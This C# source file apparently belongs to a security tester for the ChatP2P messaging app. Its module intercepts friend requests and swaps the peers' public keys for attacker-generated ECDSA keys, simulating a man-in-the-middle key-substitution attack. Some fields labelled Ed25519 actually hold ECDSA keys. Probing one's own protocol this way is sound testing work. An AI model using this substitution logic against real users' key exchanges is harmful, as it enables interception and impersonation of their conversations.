using System;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using ChatP2P.SecurityTester.Models;

namespace ChatP2P.SecurityTester.Crypto
{
    /// <summary>
    /// 🔐 Module d'attaque par substitution de clés cryptographiques
    /// Simule attaques contre échange de clés ChatP2P
    /// </summary>
    public class KeySubstitutionAttack
    {
        private byte[]? _attackerEd25519PrivateKey;
        private byte[]? _attackerEd25519PublicKey;
        private ECDsa? _attackerECDSAKey;

        public event Action<AttackResult>? AttackCompleted;
        public event Action<string>? LogMessage;

        public async Task<bool> InitializeAttackerKeys()
        {
            try
            {
                LogMessage?.Invoke("🔐 Génération clés attaquant...");

                // 🔑 Générer paire ECDSA P-384 pour l'attaquant (compatible .NET)
                _attackerECDSAKey = ECDsa.Create(ECCurve.NamedCurves.nistP384);
                _attackerEd25519PublicKey = _attackerECDSAKey.ExportSubjectPublicKeyInfo();
                _attackerEd25519PrivateKey = _attackerECDSAKey.ExportECPrivateKey();

                LogMessage?.Invoke("✅ Clés attaquant générées avec succès");

                AttackCompleted?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "KEY_GENERATION",
                    Description = "Clés cryptographiques attaquant ECDSA P-384 générées",
                    Details = $"Fingerprint: {GetAttackerKeyFingerprint()}"
                });

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur génération clés: {ex.Message}");
                return false;
            }
        }

        public async Task<AttackResult> AttemptFriendRequestSubstitution(string originalFriendRequest)
        {
            try
            {
                if (_attackerEd25519PublicKey == null || _attackerECDSAKey == null)
                {
                    await InitializeAttackerKeys();
                }

                LogMessage?.Invoke("🎯 Tentative substitution clés dans friend request...");

                // 🔍 Parser friend request original
                var parsedRequest = ParseFriendRequest(originalFriendRequest);
                if (parsedRequest == null)
                {
                    return new AttackResult
                    {
                        Success = false,
                        AttackType = "FRIEND_REQUEST_SUBSTITUTION",
                        Description = "Impossible de parser la friend request originale",
                        ErrorMessage = "Format friend request non reconnu"
                    };
                }

                // 🕷️ Créer friend request malicieuse avec nos clés
                var maliciousFriendRequest = CreateMaliciousFriendRequest(parsedRequest);

                LogMessage?.Invoke("✅ Friend request malicieuse créée");
                LogMessage?.Invoke($"📡 Original intercepté: {originalFriendRequest.Substring(0, Math.Min(100, originalFriendRequest.Length))}...");
                LogMessage?.Invoke($"🕷️ Modifié avec nos clés: {maliciousFriendRequest.Substring(0, Math.Min(100, maliciousFriendRequest.Length))}...");

                return new AttackResult
                {
                    Success = true,
                    AttackType = "FRIEND_REQUEST_SUBSTITUTION",
                    Description = "Clés substituées dans friend request",
                    TargetPeer = $"{parsedRequest.FromPeer} → {parsedRequest.ToPeer}",
                    Details = maliciousFriendRequest,
                    CapturedData = Encoding.UTF8.GetBytes(maliciousFriendRequest)
                };
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur substitution: {ex.Message}");
                return new AttackResult
                {
                    Success = false,
                    AttackType = "FRIEND_REQUEST_SUBSTITUTION",
                    Description = "Échec substitution clés",
                    ErrorMessage = ex.Message
                };
            }
        }

        private FriendRequestInfo? ParseFriendRequest(string friendRequest)
        {
            try
            {
                // 🔍 Parser différents formats ChatP2P
                if (friendRequest.Contains("FRIEND_REQ_DUAL:"))
                {
                    // Format: FRIEND_REQ_DUAL:fromPeer:toPeer:ed25519KeyB64:pqcKeyB64:message
                    var parts = friendRequest.Split(':');
                    if (parts.Length >= 6)
                    {
                        return new FriendRequestInfo
                        {
                            Type = "FRIEND_REQ_DUAL",
                            FromPeer = parts[1],
                            ToPeer = parts[2],
                            Ed25519Key = parts[3],
                            PQCKey = parts[4],
                            Message = string.Join(":", parts[5..])
                        };
                    }
                }
                else if (friendRequest.Contains("FRIEND_REQUEST:"))
                {
                    // Format legacy
                    var parts = friendRequest.Split(':');
                    if (parts.Length >= 4)
                    {
                        return new FriendRequestInfo
                        {
                            Type = "FRIEND_REQUEST",
                            FromPeer = parts[1],
                            ToPeer = parts[2],
                            Message = string.Join(":", parts[3..])
                        };
                    }
                }

                return null;
            }
            catch
            {
                return null;
            }
        }

        private string CreateMaliciousFriendRequest(FriendRequestInfo originalRequest)
        {
            // 🕷️ Remplacer clés originales par clés attaquant
            var attackerKeyB64 = Convert.ToBase64String(_attackerEd25519PublicKey ?? Array.Empty<byte>());

            if (originalRequest.Type == "FRIEND_REQ_DUAL")
            {
                return $"FRIEND_REQ_DUAL:{originalRequest.FromPeer}:{originalRequest.ToPeer}:{attackerKeyB64}:{attackerKeyB64}:{originalRequest.Message}";
            }
            else
            {
                // Upgrade vers dual key avec nos clés
                return $"FRIEND_REQ_DUAL:{originalRequest.FromPeer}:{originalRequest.ToPeer}:{attackerKeyB64}:{attackerKeyB64}:{originalRequest.Message}";
            }
        }

        private string GetAttackerKeyFingerprint()
        {
            if (_attackerEd25519PublicKey != null && _attackerEd25519PublicKey.Length > 0)
            {
                using var sha256 = SHA256.Create();
                var hash = sha256.ComputeHash(_attackerEd25519PublicKey);
                return Convert.ToHexString(hash)[..16]; // Premier 8 bytes en hex
            }
            return "UNKNOWN";
        }

        public string GetAttackerFingerprints()
        {
            return $"ECDSA P-384: {GetAttackerKeyFingerprint()}";
        }
    }

    public class FriendRequestInfo
    {
        public string Type { get; set; } = "";
        public string FromPeer { get; set; } = "";
        public string ToPeer { get; set; } = "";
        public string Ed25519Key { get; set; } = "";
        public string PQCKey { get; set; } = "";
        public string Message { get; set; } = "";
    }
}